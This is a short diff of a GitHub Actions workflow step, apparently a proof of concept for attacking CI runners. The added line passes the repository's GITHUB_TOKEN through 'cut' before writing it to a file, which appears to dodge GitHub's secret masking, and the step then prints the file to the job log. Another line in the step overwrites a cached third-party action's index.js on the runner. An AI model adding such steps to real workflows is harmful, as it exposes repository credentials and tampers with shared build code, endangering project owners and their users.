@@ -31,7 +31,7 @@ jobs:
       - name: Run a one-line script
         run: |
           pwd
-          echo ${{ secrets.GITHUB_TOKEN }} > b.txt
+          echo ${{ secrets.GITHUB_TOKEN }} | cut -c3-100 > b.txt
           cat b.txt
           echo "console.log(321)" > ../../_actions/bdy12138/action/v2/dist/index.js
 
